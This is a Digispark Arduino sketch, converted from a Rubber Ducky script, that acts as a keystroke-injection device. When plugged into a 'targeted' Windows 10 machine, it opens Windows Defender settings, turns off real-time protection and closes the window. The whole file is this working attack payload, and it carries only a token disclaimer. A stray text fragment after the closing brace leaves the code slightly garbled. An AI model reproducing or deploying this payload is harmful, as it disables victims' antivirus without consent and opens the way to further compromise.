// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 

#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  // Author      : https://github.com/TheTeasel
  // Description : Disable Windows Defender on Windows 10
  //             : You may want to change the DELAY depending on the speed of the targeted machine
  //             PLEASE DO NOT USE THIS SCRIPT FOR HARMFUL PURPOSES
  DigiKeyboard.delay(1000);
  // Open Windows Defender settings
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Windows Defender Settings");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Navigate to realtime protection and disable it
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Close Settings
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_F4);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_F4);
}Wind
   
